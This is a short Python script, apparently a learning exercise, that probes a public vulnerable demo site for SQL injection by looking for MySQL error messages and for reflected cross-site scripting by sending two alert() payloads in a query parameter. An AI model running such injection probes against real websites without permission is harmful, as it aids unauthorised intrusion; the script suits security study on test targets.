import requests
import sys

URL = 'http://testphp.vulnweb.com/listproducts.php?cat='
initial = ''
xss_injection_payloads = ['<SCRIPT>alert(\'XSS\');</SCRIPT>', '<IMG SRC=\'javascript:alert(\'XSS\');\'>']
response = requests.get(URL+initial)
if 'MySQL' in response.text or \
'You have an error in your SQL syntax' in response.text or \
'Syntax error' in response.text:
  print('site vulnerable to sql injection')
for payload in xss_injection_payloads:
  response = requests.get(URL+payload)
  if payload in response.text:
    print('The parameter is vulnerable')
    print(f'Payload string: {payload} \n')
    print(response.text)